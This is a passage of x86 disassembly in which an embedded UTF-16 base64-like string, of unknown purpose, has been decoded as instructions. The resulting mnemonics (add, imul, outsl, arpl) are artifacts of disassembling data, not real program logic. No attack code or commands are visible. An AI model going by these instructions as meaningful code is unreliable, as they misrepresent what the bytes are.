  40a1b0:	69 00 2b 00 78 00    	imul   $0x78002b,(%eax),%eax
  40a1b6:	65 00 38             	add    %bh,%gs:(%eax)
  40a1b9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a1bc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1bd:	00 75 00             	add    %dh,0x0(%ebp)
  40a1c0:	5a                   	pop    %edx
  40a1c1:	00 62 00             	add    %ah,0x0(%edx)
  40a1c4:	44                   	inc    %esp
  40a1c5:	00 6f 00             	add    %ch,0x0(%edi)
  40a1c8:	5a                   	pop    %edx
  40a1c9:	00 49 00             	add    %cl,0x0(%ecx)
  40a1cc:	63 00                	arpl   %eax,(%eax)
  40a1ce:	45                   	inc    %ebp
  40a1cf:	00 53 00             	add    %dl,0x0(%ebx)
  40a1d2:	43                   	inc    %ebx
  40a1d3:	00 32                	add    %dh,(%edx)
  40a1d5:	00 73 00             	add    %dh,0x0(%ebx)
  40a1d8:	32 00                	xor    (%eax),%al
  40a1da:	4a                   	dec    %edx
  40a1db:	00 41 00             	add    %al,0x0(%ecx)
  40a1de:	75 00                	jne    0x40a1e0
  40a1e0:	78 00                	js     0x40a1e2
  40a1e2:	73 00                	jae    0x40a1e4
  40a1e4:	59                   	pop    %ecx
  40a1e5:	00 50 00             	add    %dl,0x0(%eax)
  40a1e8:	56                   	push   %esi
  40a1e9:	00 42 00             	add    %al,0x0(%edx)
  40a1ec:	4b                   	dec    %ebx
  40a1ed:	00 78 00             	add    %bh,0x0(%eax)
  40a1f0:	65 00 6c 00 74       	add    %ch,%gs:0x74(%eax,%eax,1)
  40a1f5:	00 39                	add    %bh,(%ecx)
  40a1f7:	00 4a 00             	add    %cl,0x0(%edx)
  40a1fa:	67 00 4d 00          	add    %cl,0x0(%di)
  40a1fe:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1ff:	00 69 00             	add    %ch,0x0(%ecx)
  40a202:	38 00                	cmp    %al,(%eax)
  40a204:	2f                   	das
  40a205:	00 47 00             	add    %al,0x0(%edi)
  40a208:	52                   	push   %edx
  40a209:	00 36                	add    %dh,(%esi)
  40a20b:	00 68 00             	add    %ch,0x0(%eax)
  40a20e:	74 00                	je     0x40a210
  40a210:	71 00                	jno    0x40a212
  40a212:	34 00                	xor    $0x0,%al
  40a214:	37                   	aaa
  40a215:	00 39                	add    %bh,(%ecx)
  40a217:	00 71 00             	add    %dh,0x0(%ecx)
  40a21a:	46                   	inc    %esi
  40a21b:	00 70 00             	add    %dh,0x0(%eax)
  40a21e:	57                   	push   %edi
  40a21f:	00 33                	add    %dh,(%ebx)
  40a221:	00 37                	add    %dh,(%edi)
  40a223:	00 4d 00             	add    %cl,0x0(%ebp)
  40a226:	67 00 56 00          	add    %dl,0x0(%bp)
  40a22a:	5a                   	pop    %edx
  40a22b:	00 75 00             	add    %dh,0x0(%ebp)
  40a22e:	79 00                	jns    0x40a230
  40a230:	38 00                	cmp    %al,(%eax)
  40a232:	4d                   	dec    %ebp
  40a233:	00 48 00             	add    %cl,0x0(%eax)
  40a236:	76 00                	jbe    0x40a238
  40a238:	55                   	push   %ebp
  40a239:	00 55 00             	add    %dl,0x0(%ebp)
  40a23c:	59                   	pop    %ecx
  40a23d:	00 50 00             	add    %dl,0x0(%eax)
  40a240:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a244:	52                   	push   %edx
  40a245:	00 48 00             	add    %cl,0x0(%eax)
  40a248:	39 00                	cmp    %eax,(%eax)
  40a24a:	61                   	popa
  40a24b:	00 50 00             	add    %dl,0x0(%eax)
  40a24e:	57                   	push   %edi
  40a24f:	00 41 00             	add    %al,0x0(%ecx)
  40a252:	4a                   	dec    %edx
  40a253:	00 30                	add    %dh,(%eax)
  40a255:	00 46 00             	add    %al,0x0(%esi)
  40a258:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40a25c:	63 00                	arpl   %eax,(%eax)
  40a25e:	52                   	push   %edx
  40a25f:	00 57 00             	add    %dl,0x0(%edi)
  40a262:	6f                   	outsl  %ds:(%esi),(%dx)
  40a263:	00 4f 00             	add    %cl,0x0(%edi)
  40a266:	4e                   	dec    %esi
  40a267:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40a26b:	00 31                	add    %dh,(%ecx)
  40a26d:	00 42 00             	add    %al,0x0(%edx)
  40a270:	4e                   	dec    %esi
  40a271:	00 42 00             	add    %al,0x0(%edx)
  40a274:	31 00                	xor    %eax,(%eax)
  40a276:	48                   	dec    %eax
  40a277:	00 32                	add    %dh,(%edx)
  40a279:	00 37                	add    %dh,(%edi)
  40a27b:	00 36                	add    %dh,(%esi)
  40a27d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a280:	50                   	push   %eax
  40a281:	00 51 00             	add    %dl,0x0(%ecx)
  40a284:	4c                   	dec    %esp
  40a285:	00 2b                	add    %ch,(%ebx)
  40a287:	00 69 00             	add    %ch,0x0(%ecx)
  40a28a:	63 00                	arpl   %eax,(%eax)
  40a28c:	5a                   	pop    %edx
  40a28d:	00 78 00             	add    %bh,0x0(%eax)
  40a290:	44                   	inc    %esp
  40a291:	00 42 00             	add    %al,0x0(%edx)
  40a294:	77 00                	ja     0x40a296
  40a296:	30 00                	xor    %al,(%eax)
  40a298:	43                   	inc    %ebx
  40a299:	00 57 00             	add    %dl,0x0(%edi)
  40a29c:	43                   	inc    %ebx
  40a29d:	00 67 00             	add    %ah,0x0(%edi)
  40a2a0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a2a4:	44                   	inc    %esp
  40a2a5:	00 48 00             	add    %cl,0x0(%eax)
  40a2a8:	2f                   	das
  40a2a9:	00 4b 00             	add    %cl,0x0(%ebx)
  40a2ac:	6a 00                	push   $0x0
  40a2ae:	4e                   	dec    %esi
  40a2af:	00 46 00             	add    %al,0x0(%esi)
  40a2b2:	51                   	push   %ecx
  40a2b3:	00 47 00             	add    %al,0x0(%edi)
  40a2b6:	44                   	inc    %esp
  40a2b7:	00 36                	add    %dh,(%esi)
  40a2b9:	00 70 00             	add    %dh,0x0(%eax)
  40a2bc:	38 00                	cmp    %al,(%eax)
  40a2be:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40a2c2:	54                   	push   %esp
  40a2c3:	00 77 00             	add    %dh,0x0(%edi)
  40a2c6:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40a2ca:	61                   	popa
  40a2cb:	00 43 00             	add    %al,0x0(%ebx)
  40a2ce:	44                   	inc    %esp
  40a2cf:	00 31                	add    %dh,(%ecx)
  40a2d1:	00 49 00             	add    %cl,0x0(%ecx)
  40a2d4:	4c                   	dec    %esp
  40a2d5:	00 2b                	add    %ch,(%ebx)
  40a2d7:	00 59 00             	add    %bl,0x0(%ecx)
  40a2da:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40a2de:	59                   	pop    %ecx
  40a2df:	00 4c 00 44          	add    %cl,0x44(%eax,%eax,1)
  40a2e3:	00 59 00             	add    %bl,0x0(%ecx)
  40a2e6:	42                   	inc    %edx
  40a2e7:	00 66 00             	add    %ah,0x0(%esi)
  40a2ea:	50                   	push   %eax
  40a2eb:	00 79 00             	add    %bh,0x0(%ecx)
  40a2ee:	45                   	inc    %ebp
  40a2ef:	00 55 00             	add    %dl,0x0(%ebp)
  40a2f2:	6b 00 30             	imul   $0x30,(%eax),%eax
  40a2f5:	00 51 00             	add    %dl,0x0(%ecx)
  40a2f8:	48                   	dec    %eax
  40a2f9:	00 4f 00             	add    %cl,0x0(%edi)
  40a2fc:	62 00                	bound  %eax,(%eax)
  40a2fe:	42                   	inc    %edx
  40a2ff:	00 70 00             	add    %dh,0x0(%eax)
  40a302:	32 00                	xor    (%eax),%al
  40a304:	58                   	pop    %eax
  40a305:	00 4d 00             	add    %cl,0x0(%ebp)
  40a308:	39 00                	cmp    %eax,(%eax)
  40a30a:	53                   	push   %ebx
  40a30b:	00 39                	add    %bh,(%ecx)
  40a30d:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40a311:	00 39                	add    %bh,(%ecx)
  40a313:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a317:	00 65 00             	add    %ah,0x0(%ebp)
  40a31a:	56                   	push   %esi
  40a31b:	00 72 00             	add    %dh,0x0(%edx)
  40a31e:	5a                   	pop    %edx
  40a31f:	00 69 00             	add    %ch,0x0(%ecx)
  40a322:	4d                   	dec    %ebp
  40a323:	00 70 00             	add    %dh,0x0(%eax)
  40a326:	34 00                	xor    $0x0,%al
  40a328:	52                   	push   %edx
  40a329:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  40a32d:	00 43 00             	add    %al,0x0(%ebx)
  40a330:	6d                   	insl   (%dx),%es:(%edi)
  40a331:	00 62 00             	add    %ah,0x0(%edx)
  40a334:	69 00 31 00 51 00    	imul   $0x510031,(%eax),%eax
  40a33a:	34 00                	xor    $0x0,%al
  40a33c:	30 00                	xor    %al,(%eax)
  40a33e:	6a 00                	push   $0x0
  40a340:	50                   	push   %eax
  40a341:	00 5a 00             	add    %bl,0x0(%edx)
  40a344:	46                   	inc    %esi
  40a345:	00 33                	add    %dh,(%ebx)
  40a347:	00 52 00             	add    %dl,0x0(%edx)
  40a34a:	35 00 62 00 79       	xor    $0x79006200,%eax
  40a34f:	00 7a 00             	add    %bh,0x0(%edx)
  40a352:	33 00                	xor    (%eax),%eax
  40a354:	39 00                	cmp    %eax,(%eax)
  40a356:	33 00                	xor    (%eax),%eax
  40a358:	6a 00                	push   $0x0
  40a35a:	56                   	push   %esi
  40a35b:	00 62 00             	add    %ah,0x0(%edx)
  40a35e:	74 00                	je     0x40a360
  40a360:	6e                   	outsb  %ds:(%esi),(%dx)
  40a361:	00 48 00             	add    %cl,0x0(%eax)
  40a364:	71 00                	jno    0x40a366
  40a366:	70 00                	jo     0x40a368
  40a368:	4c                   	dec    %esp
  40a369:	00 68 00             	add    %ch,0x0(%eax)
  40a36c:	55                   	push   %ebp
  40a36d:	00 48 00             	add    %cl,0x0(%eax)
  40a370:	42                   	inc    %edx
  40a371:	00 38                	add    %bh,(%eax)
  40a373:	00 56 00             	add    %dl,0x0(%esi)
  40a376:	76 00                	jbe    0x40a378
  40a378:	44                   	inc    %esp
  40a379:	00 58 00             	add    %bl,0x0(%eax)
  40a37c:	6c                   	insb   (%dx),%es:(%edi)
  40a37d:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  40a381:	00 71 00             	add    %dh,0x0(%ecx)
  40a384:	4f                   	dec    %edi
  40a385:	00 59 00             	add    %bl,0x0(%ecx)
  40a388:	4d                   	dec    %ebp
  40a389:	00 38                	add    %bh,(%eax)
  40a38b:	00 31                	add    %dh,(%ecx)
  40a38d:	00 52 00             	add    %dl,0x0(%edx)
  40a390:	35 00 6b 00 32       	xor    $0x32006b00,%eax
  40a395:	00 62 00             	add    %ah,0x0(%edx)
  40a398:	35 00 55 00 6e       	xor    $0x6e005500,%eax
  40a39d:	00 39                	add    %bh,(%ecx)
  40a39f:	00 47 00             	add    %al,0x0(%edi)
  40a3a2:	53                   	push   %ebx
  40a3a3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a3a6:	62 00                	bound  %eax,(%eax)
  40a3a8:	30 00                	xor    %al,(%eax)
  40a3aa:	63 00                	arpl   %eax,(%eax)
  40a3ac:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40a3b0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3b1:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40a3b5:	00 53 00             	add    %dl,0x0(%ebx)
  40a3b8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3b9:	00 79 00             	add    %bh,0x0(%ecx)
  40a3bc:	71 00                	jno    0x40a3be
  40a3be:	79 00                	jns    0x40a3c0
  40a3c0:	67 00 33             	add    %dh,(%bp,%di)
  40a3c3:	00 51 00             	add    %dl,0x0(%ecx)
  40a3c6:	56                   	push   %esi
  40a3c7:	00 66 00             	add    %ah,0x0(%esi)
  40a3ca:	53                   	push   %ebx
  40a3cb:	00 77 00             	add    %dh,0x0(%edi)
  40a3ce:	59                   	pop    %ecx
  40a3cf:	00 65 00             	add    %ah,0x0(%ebp)
  40a3d2:	37                   	aaa
  40a3d3:	00 66 00             	add    %ah,0x0(%esi)
  40a3d6:	4d                   	dec    %ebp
  40a3d7:	00 2b                	add    %ch,(%ebx)
  40a3d9:	00 70 00             	add    %dh,0x0(%eax)
  40a3dc:	44                   	inc    %esp
  40a3dd:	00 79 00             	add    %bh,0x0(%ecx)
  40a3e0:	70 00                	jo     0x40a3e2
  40a3e2:	79 00                	jns    0x40a3e4
  40a3e4:	57                   	push   %edi
  40a3e5:	00 6d 00             	add    %ch,0x0(%ebp)
  40a3e8:	6b 00 63             	imul   $0x63,(%eax),%eax
  40a3eb:	00 38                	add    %bh,(%eax)
  40a3ed:	00 4e 00             	add    %cl,0x0(%esi)
  40a3f0:	4b                   	dec    %ebx
  40a3f1:	00 63 00             	add    %ah,0x0(%ebx)
  40a3f4:	51                   	push   %ecx
  40a3f5:	00 7a 00             	add    %bh,0x0(%edx)
  40a3f8:	7a 00                	jp     0x40a3fa
  40a3fa:	70 00                	jo     0x40a3fc
  40a3fc:	77 00                	ja     0x40a3fe
  40a3fe:	30 00                	xor    %al,(%eax)
  40a400:	42                   	inc    %edx
  40a401:	00 59 00             	add    %bl,0x0(%ecx)
  40a404:	50                   	push   %eax
  40a405:	00 49 00             	add    %cl,0x0(%ecx)
  40a408:	35 00 74 00 59       	xor    $0x59007400,%eax
  40a40d:	00 63 00             	add    %ah,0x0(%ebx)
  40a410:	53                   	push   %ebx
  40a411:	00 75 00             	add    %dh,0x0(%ebp)
  40a414:	55                   	push   %ebp
  40a415:	00 30                	add    %dh,(%eax)
  40a417:	00 79 00             	add    %bh,0x0(%ecx)
  40a41a:	7a 00                	jp     0x40a41c
  40a41c:	72 00                	jb     0x40a41e
  40a41e:	77 00                	ja     0x40a420
  40a420:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40a424:	56                   	push   %esi
  40a425:	00 68 00             	add    %ch,0x0(%eax)
  40a428:	56                   	push   %esi
  40a429:	00 6d 00             	add    %ch,0x0(%ebp)
  40a42c:	43                   	inc    %ebx
  40a42d:	00 52 00             	add    %dl,0x0(%edx)
  40a430:	37                   	aaa
  40a431:	00 6f 00             	add    %ch,0x0(%edi)
  40a434:	43                   	inc    %ebx
  40a435:	00 72 00             	add    %dh,0x0(%edx)
  40a438:	34 00                	xor    $0x0,%al
  40a43a:	46                   	inc    %esi
  40a43b:	00 2b                	add    %ch,(%ebx)
  40a43d:	00 30                	add    %dh,(%eax)
  40a43f:	00 72 00             	add    %dh,0x0(%edx)
  40a442:	59                   	pop    %ecx
  40a443:	00 49 00             	add    %cl,0x0(%ecx)
  40a446:	58                   	pop    %eax
  40a447:	00 78 00             	add    %bh,0x0(%eax)
  40a44a:	46                   	inc    %esi
  40a44b:	00 38                	add    %bh,(%eax)
  40a44d:	00 4a 00             	add    %cl,0x0(%edx)
  40a450:	41                   	inc    %ecx
  40a451:	00 72 00             	add    %dh,0x0(%edx)
  40a454:	6a 00                	push   $0x0
  40a456:	7a 00                	jp     0x40a458
  40a458:	77 00                	ja     0x40a45a
  40a45a:	58                   	pop    %eax
  40a45b:	00 68 00             	add    %ch,0x0(%eax)
  40a45e:	42                   	inc    %edx
  40a45f:	00 36                	add    %dh,(%esi)
  40a461:	00 4f 00             	add    %cl,0x0(%edi)
  40a464:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  40a468:	75 00                	jne    0x40a46a
  40a46a:	50                   	push   %eax
  40a46b:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40a46f:	00 6f 00             	add    %ch,0x0(%edi)
  40a472:	4e                   	dec    %esi
  40a473:	00 37                	add    %dh,(%edi)
  40a475:	00 6f 00             	add    %ch,0x0(%edi)
  40a478:	59                   	pop    %ecx
  40a479:	00 49 00             	add    %cl,0x0(%ecx)
  40a47c:	2b 00                	sub    (%eax),%eax
  40a47e:	7a 00                	jp     0x40a480
  40a480:	42                   	inc    %edx
  40a481:	00 75 00             	add    %dh,0x0(%ebp)
  40a484:	58                   	pop    %eax
  40a485:	00 45 00             	add    %al,0x0(%ebp)
  40a488:	58                   	pop    %eax
  40a489:	00 78 00             	add    %bh,0x0(%eax)
  40a48c:	73 00                	jae    0x40a48e
  40a48e:	34 00                	xor    $0x0,%al
  40a490:	51                   	push   %ecx
  40a491:	00 32                	add    %dh,(%edx)
  40a493:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40a497:	00 77 00             	add    %dh,0x0(%edi)
  40a49a:	48                   	dec    %eax
  40a49b:	00 30                	add    %dh,(%eax)
  40a49d:	00 63 00             	add    %ah,0x0(%ebx)
  40a4a0:	46                   	inc    %esi
  40a4a1:	00 79 00             	add    %bh,0x0(%ecx)
  40a4a4:	6a 00                	push   $0x0
  40a4a6:	31 00                	xor    %eax,(%eax)
  40a4a8:	4f                   	dec    %edi
  40a4a9:	00 62 00             	add    %ah,0x0(%edx)
  40a4ac:	62 00                	bound  %eax,(%eax)
  40a4ae:	35 00 34 00 43       	xor    $0x43003400,%eax
  40a4b3:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40a4b7:	00 5a 00             	add    %bl,0x0(%edx)
  40a4ba:	4f                   	dec    %edi
  40a4bb:	00 4e 00             	add    %cl,0x0(%esi)
  40a4be:	58                   	pop    %eax
  40a4bf:	00 53 00             	add    %dl,0x0(%ebx)
  40a4c2:	4f                   	dec    %edi
  40a4c3:	00 4b 00             	add    %cl,0x0(%ebx)
  40a4c6:	63 00                	arpl   %eax,(%eax)
  40a4c8:	74 00                	je     0x40a4ca
  40a4ca:	76 00                	jbe    0x40a4cc
  40a4cc:	77 00                	ja     0x40a4ce
  40a4ce:	59                   	pop    %ecx
  40a4cf:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a4d3:	00 31                	add    %dh,(%ecx)
  40a4d5:	00 2b                	add    %ch,(%ebx)
  40a4d7:	00 73 00             	add    %dh,0x0(%ebx)
  40a4da:	4f                   	dec    %edi
  40a4db:	00 63 00             	add    %ah,0x0(%ebx)
  40a4de:	41                   	inc    %ecx
  40a4df:	00 56 00             	add    %dl,0x0(%esi)
  40a4e2:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40a4e6:	35 00 53 00 4d       	xor    $0x4d005300,%eax
  40a4eb:	00 46 00             	add    %al,0x0(%esi)
  40a4ee:	74 00                	je     0x40a4f0
  40a4f0:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40a4f4:	2b 00                	sub    (%eax),%eax
  40a4f6:	7a 00                	jp     0x40a4f8
  40a4f8:	4f                   	dec    %edi
  40a4f9:	00 6a 00             	add    %ch,0x0(%edx)
  40a4fc:	4f                   	dec    %edi
  40a4fd:	00 6f 00             	add    %ch,0x0(%edi)
  40a500:	32 00                	xor    (%eax),%al
  40a502:	46                   	inc    %esi
  40a503:	00 6a 00             	add    %ch,0x0(%edx)
  40a506:	4a                   	dec    %edx
  40a507:	00 4b 00             	add    %cl,0x0(%ebx)
  40a50a:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40a50e:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40a512:	71 00                	jno    0x40a514
  40a514:	56                   	push   %esi
  40a515:	00 49 00             	add    %cl,0x0(%ecx)
  40a518:	69 00 37 00 70 00    	imul   $0x700037,(%eax),%eax
  40a51e:	53                   	push   %ebx
  40a51f:	00 57 00             	add    %dl,0x0(%edi)
  40a522:	32 00                	xor    (%eax),%al
  40a524:	35 00 4a 00 36       	xor    $0x36004a00,%eax
  40a529:	00 47 00             	add    %al,0x0(%edi)
  40a52c:	52                   	push   %edx
  40a52d:	00 78 00             	add    %bh,0x0(%eax)
  40a530:	4f                   	dec    %edi
  40a531:	00 7a 00             	add    %bh,0x0(%edx)
  40a534:	46                   	inc    %esi
  40a535:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40a539:	00 2b                	add    %ch,(%ebx)
  40a53b:	00 59 00             	add    %bl,0x0(%ecx)
  40a53e:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  40a542:	62 00                	bound  %eax,(%eax)
  40a544:	48                   	dec    %eax
  40a545:	00 45 00             	add    %al,0x0(%ebp)
  40a548:	38 00                	cmp    %al,(%eax)
  40a54a:	72 00                	jb     0x40a54c
  40a54c:	4f                   	dec    %edi
  40a54d:	00 2f                	add    %ch,(%edi)
  40a54f:	00 56 00             	add    %dl,0x0(%esi)
  40a552:	64 00 33             	add    %dh,%fs:(%ebx)
  40a555:	00 4e 00             	add    %cl,0x0(%esi)
  40a558:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40a55c:	38 00                	cmp    %al,(%eax)
  40a55e:	35 00 43 00 69       	xor    $0x69004300,%eax
  40a563:	00 41 00             	add    %al,0x0(%ecx)
  40a566:	47                   	inc    %edi
  40a567:	00 58 00             	add    %bl,0x0(%eax)
  40a56a:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40a56e:	38 00                	cmp    %al,(%eax)
  40a570:	34 00                	xor    $0x0,%al
  40a572:	4f                   	dec    %edi
  40a573:	00 5a 00             	add    %bl,0x0(%edx)
  40a576:	48                   	dec    %eax
  40a577:	00 53 00             	add    %dl,0x0(%ebx)
  40a57a:	68 00 53 00 65       	push   $0x65005300
  40a57f:	00 77 00             	add    %dh,0x0(%edi)
  40a582:	42                   	inc    %edx
  40a583:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a586:	32 00                	xor    (%eax),%al
  40a588:	52                   	push   %edx
  40a589:	00 7a 00             	add    %bh,0x0(%edx)
  40a58c:	68 00 33 00 73       	push   $0x73003300
  40a591:	00 6e 00             	add    %ch,0x0(%esi)
  40a594:	48                   	dec    %eax
  40a595:	00 79 00             	add    %bh,0x0(%ecx)
  40a598:	5a                   	pop    %edx
  40a599:	00 67 00             	add    %ah,0x0(%edi)
  40a59c:	63 00                	arpl   %eax,(%eax)
  40a59e:	71 00                	jno    0x40a5a0
  40a5a0:	35 00 57 00 6b       	xor    $0x6b005700,%eax
  40a5a5:	00 65 00             	add    %ah,0x0(%ebp)
  40a5a8:	42                   	inc    %edx
  40a5a9:	00 76 00             	add    %dh,0x0(%esi)
  40a5ac:	4a                   	dec    %edx
  40a5ad:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5b0:	79 00                	jns    0x40a5b2
  40a5b2:	79 00                	jns    0x40a5b4
  40a5b4:	35 00 44 00 33       	xor    $0x33004400,%eax
  40a5b9:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  40a5bd:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5c0:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40a5c4:	72 00                	jb     0x40a5c6
  40a5c6:	4e                   	dec    %esi
  40a5c7:	00 41 00             	add    %al,0x0(%ecx)
  40a5ca:	34 00                	xor    $0x0,%al
  40a5cc:	39 00                	cmp    %eax,(%eax)
  40a5ce:	54                   	push   %esp
  40a5cf:	00 77 00             	add    %dh,0x0(%edi)
  40a5d2:	55                   	push   %ebp
  40a5d3:	00 66 00             	add    %ah,0x0(%esi)
  40a5d6:	76 00                	jbe    0x40a5d8
  40a5d8:	66 00 39             	data16 add %bh,(%ecx)
  40a5db:	00 2f                	add    %ch,(%edi)
  40a5dd:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  40a5e1:	00 78 00             	add    %bh,0x0(%eax)
  40a5e4:	6a 00                	push   $0x0
  40a5e6:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40a5ea:	51                   	push   %ecx
  40a5eb:	00 73 00             	add    %dh,0x0(%ebx)
  40a5ee:	58                   	pop    %eax
  40a5ef:	00 53 00             	add    %dl,0x0(%ebx)
  40a5f2:	30 00                	xor    %al,(%eax)
  40a5f4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5f5:	00 7a 00             	add    %bh,0x0(%edx)
  40a5f8:	67 00 66 00          	add    %ah,0x0(%bp)
  40a5fc:	6d                   	insl   (%dx),%es:(%edi)
  40a5fd:	00 4b 00             	add    %cl,0x0(%ebx)
  40a600:	36 00 42 00          	add    %al,%ss:0x0(%edx)
  40a604:	69 00 31 00 6b 00    	imul   $0x6b0031,(%eax),%eax
  40a60a:	78 00                	js     0x40a60c
  40a60c:	46                   	inc    %esi
  40a60d:	00 52 00             	add    %dl,0x0(%edx)
  40a610:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40a614:	59                   	pop    %ecx
  40a615:	00 67 00             	add    %ah,0x0(%edi)
  40a618:	5a                   	pop    %edx
  40a619:	00 39                	add    %bh,(%ecx)
  40a61b:	00 43 00             	add    %al,0x0(%ebx)
  40a61e:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40a622:	71 00                	jno    0x40a624
  40a624:	4d                   	dec    %ebp
  40a625:	00 78 00             	add    %bh,0x0(%eax)
  40a628:	71 00                	jno    0x40a62a
  40a62a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a62b:	00 4e 00             	add    %cl,0x0(%esi)
  40a62e:	53                   	push   %ebx
  40a62f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a632:	58                   	pop    %eax
  40a633:	00 56 00             	add    %dl,0x0(%esi)
  40a636:	61                   	popa
  40a637:	00 45 00             	add    %al,0x0(%ebp)
  40a63a:	5a                   	pop    %edx
  40a63b:	00 4e 00             	add    %cl,0x0(%esi)
  40a63e:	2f                   	das
  40a63f:	00 6a 00             	add    %ch,0x0(%edx)
  40a642:	2f                   	das
  40a643:	00 46 00             	add    %al,0x0(%esi)
  40a646:	45                   	inc    %ebp
  40a647:	00 62 00             	add    %ah,0x0(%edx)
  40a64a:	2b 00                	sub    (%eax),%eax
  40a64c:	68 00 68 00 45       	push   $0x45006800
  40a651:	00 66 00             	add    %ah,0x0(%esi)
  40a654:	4d                   	dec    %ebp
  40a655:	00 31                	add    %dh,(%ecx)
  40a657:	00 75 00             	add    %dh,0x0(%ebp)
  40a65a:	62 00                	bound  %eax,(%eax)
  40a65c:	6d                   	insl   (%dx),%es:(%edi)
  40a65d:	00 61 00             	add    %ah,0x0(%ecx)
  40a660:	74 00                	je     0x40a662
  40a662:	32 00                	xor    (%eax),%al
  40a664:	42                   	inc    %edx
  40a665:	00 6a 00             	add    %ch,0x0(%edx)
  40a668:	38 00                	cmp    %al,(%eax)
  40a66a:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40a66d:	00 6f 00             	add    %ch,0x0(%edi)
  40a670:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40a674:	66 00 31             	data16 add %dh,(%ecx)
  40a677:	00 6a 00             	add    %ch,0x0(%edx)
  40a67a:	4c                   	dec    %esp
  40a67b:	00 44 00 4f          	add    %al,0x4f(%eax,%eax,1)
  40a67f:	00 66 00             	add    %ah,0x0(%esi)
  40a682:	4a                   	dec    %edx
  40a683:	00 49 00             	add    %cl,0x0(%ecx)
  40a686:	73 00                	jae    0x40a688
  40a688:	33 00                	xor    (%eax),%eax
  40a68a:	59                   	pop    %ecx
  40a68b:	00 42 00             	add    %al,0x0(%edx)
  40a68e:	75 00                	jne    0x40a690
  40a690:	32 00                	xor    (%eax),%al
  40a692:	55                   	push   %ebp
  40a693:	00 75 00             	add    %dh,0x0(%ebp)
  40a696:	75 00                	jne    0x40a698
  40a698:	6a 00                	push   $0x0
  40a69a:	68 00 71 00 5a       	push   $0x5a007100
  40a69f:	00 51 00             	add    %dl,0x0(%ecx)
  40a6a2:	72 00                	jb     0x40a6a4
  40a6a4:	34 00                	xor    $0x0,%al
  40a6a6:	58                   	pop    %eax
  40a6a7:	00 79 00             	add    %bh,0x0(%ecx)
  40a6aa:	31 00                	xor    %eax,(%eax)
  40a6ac:	59                   	pop    %ecx
  40a6ad:	00 43 00             	add    %al,0x0(%ebx)
  40a6b0:	7a 00                	jp     0x40a6b2
  40a6b2:	75 00                	jne    0x40a6b4
  40a6b4:	4d                   	dec    %ebp
  40a6b5:	00 66 00             	add    %ah,0x0(%esi)
  40a6b8:	4d                   	dec    %ebp
  40a6b9:	00 68 00             	add    %ch,0x0(%eax)
  40a6bc:	6c                   	insb   (%dx),%es:(%edi)
  40a6bd:	00 78 00             	add    %bh,0x0(%eax)
  40a6c0:	6c                   	insb   (%dx),%es:(%edi)
  40a6c1:	00 52 00             	add    %dl,0x0(%edx)
  40a6c4:	45                   	inc    %ebp
  40a6c5:	00 53 00             	add    %dl,0x0(%ebx)
  40a6c8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6c9:	00 69 00             	add    %ch,0x0(%ecx)
  40a6cc:	76 00                	jbe    0x40a6ce
  40a6ce:	78 00                	js     0x40a6d0
  40a6d0:	6c                   	insb   (%dx),%es:(%edi)
  40a6d1:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40a6d5:	00 4e 00             	add    %cl,0x0(%esi)
  40a6d8:	61                   	popa
  40a6d9:	00 43 00             	add    %al,0x0(%ebx)
  40a6dc:	41                   	inc    %ecx
  40a6dd:	00 6d 00             	add    %ch,0x0(%ebp)
  40a6e0:	79 00                	jns    0x40a6e2
  40a6e2:	4d                   	dec    %ebp
  40a6e3:	00 79 00             	add    %bh,0x0(%ecx)
  40a6e6:	79 00                	jns    0x40a6e8
  40a6e8:	46                   	inc    %esi
  40a6e9:	00 79 00             	add    %bh,0x0(%ecx)
  40a6ec:	45                   	inc    %ebp
  40a6ed:	00 57 00             	add    %dl,0x0(%edi)
  40a6f0:	36 00 6c 00 4c       	add    %ch,%ss:0x4c(%eax,%eax,1)
